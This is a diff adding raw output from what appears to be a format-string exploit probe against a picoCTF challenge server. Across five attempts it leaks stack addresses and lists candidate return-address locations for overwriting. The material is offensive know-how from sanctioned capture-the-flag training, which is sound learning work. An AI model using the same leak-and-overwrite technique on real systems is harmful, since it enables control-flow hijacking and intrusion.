@@ -1,0 +1,100 @@
+[x] Opening connection to shape-facility.picoctf.net on port 58477
+[x] Opening connection to shape-facility.picoctf.net on port 58477: Trying 3.20.150.139
+[+] Opening connection to shape-facility.picoctf.net on port 58477: Done
+
+[*] Attempt 1:
+    Pos 20: 0x7fffcb32bf70
+    Pos 21 (ret val): 0x61291b5be413
+    Pos 22: 0x7fffcb32c010
+    Pos 23: 0x7f21e9f6c1ca
+    Pos 24: 0x7fffcb32bfc0
+    Diff 22-20: 0xa0
+    Diff 24-22: -0x50
+    Possible ret location: 0x7fffcb32bff8 (stack24 + 0x38)
+    Possible ret location: 0x7fffcb32c000 (stack24 + 0x40)
+    Possible ret location: 0x7fffcb32c008 (stack24 + 0x48)
+    Possible ret location: 0x7fffcb32c010 (stack24 + 0x50)
+    Possible ret location: 0x7fffcb32c018 (stack24 + 0x58)
+    Possible ret location: 0x7fffcb32c020 (stack24 + 0x60)
+    Possible ret location: 0x7fffcb32c028 (stack24 + 0x68)
+[*] Closed connection to shape-facility.picoctf.net port 58477
+[x] Opening connection to shape-facility.picoctf.net on port 58477
+[x] Opening connection to shape-facility.picoctf.net on port 58477: Trying 3.20.150.139
+[+] Opening connection to shape-facility.picoctf.net on port 58477: Done
+
+[*] Attempt 2:
+    Pos 20: 0x7fffc947fd50
+    Pos 21 (ret val): 0x5fed4f37b413
+    Pos 22: 0x7fffc947fdf0
+    Pos 23: 0x75ed91b7b1ca
+    Pos 24: 0x7fffc947fda0
+    Diff 22-20: 0xa0
+    Diff 24-22: -0x50
+    Possible ret location: 0x7fffc947fdd8 (stack24 + 0x38)
+    Possible ret location: 0x7fffc947fde0 (stack24 + 0x40)
+    Possible ret location: 0x7fffc947fde8 (stack24 + 0x48)
+    Possible ret location: 0x7fffc947fdf0 (stack24 + 0x50)
+    Possible ret location: 0x7fffc947fdf8 (stack24 + 0x58)
+    Possible ret location: 0x7fffc947fe00 (stack24 + 0x60)
+    Possible ret location: 0x7fffc947fe08 (stack24 + 0x68)
+[*] Closed connection to shape-facility.picoctf.net port 58477
+[x] Opening connection to shape-facility.picoctf.net on port 58477
+[x] Opening connection to shape-facility.picoctf.net on port 58477: Trying 3.20.150.139
+[+] Opening connection to shape-facility.picoctf.net on port 58477: Done
+
+[*] Attempt 3:
+    Pos 20: 0x7ffc07cf5e10
+    Pos 21 (ret val): 0x59f66a853413
+    Pos 22: 0x7ffc07cf5eb0
+    Pos 23: 0x73af655ee1ca
+    Pos 24: 0x7ffc07cf5e60
+    Diff 22-20: 0xa0
+    Diff 24-22: -0x50
+    Possible ret location: 0x7ffc07cf5e98 (stack24 + 0x38)
+    Possible ret location: 0x7ffc07cf5ea0 (stack24 + 0x40)
+    Possible ret location: 0x7ffc07cf5ea8 (stack24 + 0x48)
+    Possible ret location: 0x7ffc07cf5eb0 (stack24 + 0x50)
+    Possible ret location: 0x7ffc07cf5eb8 (stack24 + 0x58)
+    Possible ret location: 0x7ffc07cf5ec0 (stack24 + 0x60)
+    Possible ret location: 0x7ffc07cf5ec8 (stack24 + 0x68)
+[*] Closed connection to shape-facility.picoctf.net port 58477
+[x] Opening connection to shape-facility.picoctf.net on port 58477
+[x] Opening connection to shape-facility.picoctf.net on port 58477: Trying 3.20.150.139
+[+] Opening connection to shape-facility.picoctf.net on port 58477: Done
+
+[*] Attempt 4:
+    Pos 20: 0x7fff7e36bae0
+    Pos 21 (ret val): 0x569f91237413
+    Pos 22: 0x7fff7e36bb80
+    Pos 23: 0x75834ae441ca
+    Pos 24: 0x7fff7e36bb30
+    Diff 22-20: 0xa0
+    Diff 24-22: -0x50
+    Possible ret location: 0x7fff7e36bb68 (stack24 + 0x38)
+    Possible ret location: 0x7fff7e36bb70 (stack24 + 0x40)
+    Possible ret location: 0x7fff7e36bb78 (stack24 + 0x48)
+    Possible ret location: 0x7fff7e36bb80 (stack24 + 0x50)
+    Possible ret location: 0x7fff7e36bb88 (stack24 + 0x58)
+    Possible ret location: 0x7fff7e36bb90 (stack24 + 0x60)
+    Possible ret location: 0x7fff7e36bb98 (stack24 + 0x68)
+[*] Closed connection to shape-facility.picoctf.net port 58477
+[x] Opening connection to shape-facility.picoctf.net on port 58477
+[x] Opening connection to shape-facility.picoctf.net on port 58477: Trying 3.20.150.139
+[+] Opening connection to shape-facility.picoctf.net on port 58477: Done
+
+[*] Attempt 5:
+    Pos 20: 0x7ffc1cf916b0
+    Pos 21 (ret val): 0x5f2cb995b413
+    Pos 22: 0x7ffc1cf91750
+    Pos 23: 0x7f44bc1761ca
+    Pos 24: 0x7ffc1cf91700
+    Diff 22-20: 0xa0
+    Diff 24-22: -0x50
+    Possible ret location: 0x7ffc1cf91738 (stack24 + 0x38)
+    Possible ret location: 0x7ffc1cf91740 (stack24 + 0x40)
+    Possible ret location: 0x7ffc1cf91748 (stack24 + 0x48)
+    Possible ret location: 0x7ffc1cf91750 (stack24 + 0x50)
+    Possible ret location: 0x7ffc1cf91758 (stack24 + 0x58)
+    Possible ret location: 0x7ffc1cf91760 (stack24 + 0x60)
+    Possible ret location: 0x7ffc1cf91768 (stack24 + 0x68)
+[*] Closed connection to shape-facility.picoctf.net port 58477
